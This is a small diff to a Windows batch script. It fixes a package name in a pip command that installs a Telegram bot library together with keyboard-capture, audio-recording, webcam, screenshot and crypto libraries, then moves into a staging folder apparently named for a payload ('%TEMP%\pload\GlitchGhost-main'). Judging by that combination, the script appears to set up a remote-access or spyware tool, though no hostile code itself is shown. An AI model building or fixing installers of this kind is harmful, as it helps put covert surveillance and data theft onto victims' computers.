@@ -25,5 +25,5 @@ cd pyscreeze-1.0.1
 xcopy /E /I pyscreeze C:\Python\lib\site-packages\pyscreeze
 cd C:\Python\lib\site-packages
 echo Installing requests package...
-C:\Python\python C:\Python\Lib\site-packages\pip install requests python-telegram-bot5 pypiwin32 pycryptodome cryptography==41.0.7 pynput sounddevice scipy opencv-python numpy setuptools pillow
+C:\Python\python C:\Python\Lib\site-packages\pip install requests python-telegram-bot pypiwin32 pycryptodome cryptography==41.0.7 pynput sounddevice scipy opencv-python numpy setuptools pillow
 cd %TEMP%\pload\GlitchGhost-main
